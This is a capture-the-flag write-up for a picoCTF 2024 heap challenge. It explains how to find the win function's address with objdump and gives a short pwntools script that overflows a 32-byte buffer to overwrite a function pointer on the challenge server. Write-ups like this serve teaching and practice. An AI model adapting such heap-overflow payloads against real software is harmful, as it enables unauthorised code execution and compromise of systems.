# Description

_#Medium_<br>
_#Binary_Exploitation_<br>
_#picoCTF_2024_<br>
_#format_string_<br>
_#heap_<br>

Can you handle function pointers?<br>
Download the binary [here](../chall).<br>
Download the source [here](../chall.c).

## Solution

First, I executed the source code to observe the output. I tried entering different option numbers to see the corresponding results.

![image](https://github.com/user-attachments/assets/acbf2097-01fa-42fb-bfdc-08d69c4b812f)<br>
**From the heap table, we can see that both addresses are the same. This indicates that 32 bytes can be used to reach the boundary.*

I then reviewed the source code to identify any possible way to obtain the flag. Here’s what I discovered:

![image](https://github.com/user-attachments/assets/186485dd-0f6a-47b1-a7d1-d637d8dbc306)<br>
**To retrieve the flag, we need to call the win function.*

In this case, we need to access the win function to obtain the flag. Therefore, we must locate the address of the win function. To do this, I used the command `objdump -D chall > output.txt` to export the output to a .txt file. Once we obtain the address in big-endian format, we need to convert it to little-endian format by using [endian converter](https://blockchain-academy.hs-mittweida.de/litte-big-endian-converter/).

![image](https://github.com/user-attachments/assets/8c317638-ed8d-4628-8188-86c9ae43645d)
**The highlighted part is the address of win function.*

> [!NOTE]
> When writing payload scripts, little-endian format must be used.

```python
from pwn import *

p = remote('mimas.picoctf.net', 64646)

p.sendline(b"2")
p.recvuntil(b"buffer:")
p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00")

p.recvuntil(b"choice:")
p.sendline(b"4")
print(p.recvall())
```
**This is the payload script that we'll use.*

Run the script in an environment, and you'll obtain the flag.
